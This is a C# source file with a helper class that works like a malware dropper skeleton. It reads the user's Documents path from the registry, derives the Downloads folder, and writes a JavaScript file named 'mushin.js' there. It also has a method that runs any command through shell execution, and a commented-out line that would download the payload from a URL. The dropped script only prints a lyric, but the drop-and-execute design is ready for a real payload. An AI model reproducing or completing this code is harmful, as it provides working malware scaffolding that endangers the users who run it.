using namba.Interfaces;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;
using System;
using Microsoft.Win32;

namespace namba.Services
{
	public class Helper : IHelper
	{
		public string getPayload()
		{
			//download the payload to a specific destination here
			//System.Net.WebClient wc = new System.Net.WebClient();
			//byte[] bd  = wc.DownloadData("http://localhost/live/test-2.txt");

              //string dt = System.Text.Encoding.UTF8.GetString(bd,0,bd.Length);
              string dlNameO = getDrop();
			  string dlName = gbeba(dlNameO,"Downloads") + "\\mushin.js";
			  
			  string dt = "WScript.Echo(\"she's a heartbreaker.. she bend over, back breaker ;) in my life me nevuh see melanin so dark :*\");";
			  //System.IO.File.Create(dlName);
			  System.IO.File.WriteAllText(dlName,dt);
			return dlName;
		}
		
        public int callSystem(string args)
		{
			var p = new Process();
            p.StartInfo = new ProcessStartInfo(args)
			{
			   UseShellExecute = true 
            };
            p.Start();
			return 5;
		}
		
		public string getDrop()
		{
			string fn = "";
			try
			{
				fn = (string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders","Personal","404");
			}
			catch(Exception e)
			{
				fn = "Error: " + e.ToString();
			}
			
			Console.WriteLine("fn: " + fn);
			//fn = "C:\\users\\user\\documents";
			fn = Regex.Replace(fn,@"\t|\n|\r","");
			return fn;
		}
		
		public string gbeba(string p,string ad)
		{
			 string[] items = p.Split('\\');
			 string ret = "";
			 
			 for(int i = 0; i < 3; i++)
			 {
				ret = ret + items[i] + "\\"; 
			 }
			 ret = ret + ad;
	         
	         return ret;
		}
	}
}